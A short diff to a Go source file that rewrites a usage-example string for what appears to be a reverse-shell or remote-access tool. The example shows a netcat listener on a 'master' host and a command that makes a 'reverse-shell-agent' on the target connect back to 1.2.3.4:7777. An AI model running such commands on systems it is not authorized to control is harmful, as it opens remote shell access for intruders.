@@ -13,13 +13,10 @@ import (
 
 const (
 	tcpListenerExample = `# On the master (1.2.3.4)
-$ master listen --port 7777
-
-# Or with netcat
 $ nc -v -l -p 7777
 
 # On the target
-$ agent tcp -A 1.2.3.4:7777
+$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
 `
 )
 
